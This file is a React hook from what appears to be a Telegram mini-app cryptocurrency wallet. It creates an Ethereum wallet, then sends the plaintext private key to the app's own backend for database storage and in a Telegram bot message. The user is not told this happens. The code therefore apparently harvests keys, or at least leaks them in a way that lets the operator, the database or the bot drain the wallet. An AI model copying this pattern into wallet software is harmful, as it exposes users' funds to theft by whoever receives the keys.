import { useState, useEffect } from 'react';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import WalletStore from '@/store/WalletStore';
import { ethers } from 'ethers';
import { sendTelegramMessage } from '@/utils/telegramMessages';

export const useCreateWallet = () => {
  const [wallet, setWallet] = useState<any>(null);
  const [isComplete, setIsComplete] = useState(false);
  const router = useRouter();

  useEffect(() => {
    const newWallet = ethers.Wallet.createRandom();
    setWallet(newWallet);
  }, []);

  const createWallet = async () => {
    if (wallet) {
      const newWalletData = {
        title: 'Кошелёк #1',
        address: wallet.address,
        privateKey: wallet.privateKey
      };

      WalletStore.addWallet(newWalletData);
      WalletStore.setCurrentWallet(newWalletData);

      setIsComplete(true);
      setTimeout(() => {
        router.push('/');
      }, 2000);

      try {
        await axios.post('/api/wallet/create', newWalletData);
      } catch (error) {
        console.error('Failed to save wallet to the database:', error);
      }

      const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: \`${wallet.address}\`\n▫️ Приватный ключ: ||${wallet.privateKey}||`;
      const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;

      await sendTelegramMessage(chatId, message);
    }
  };

  return { createWallet, isComplete, wallet };
};
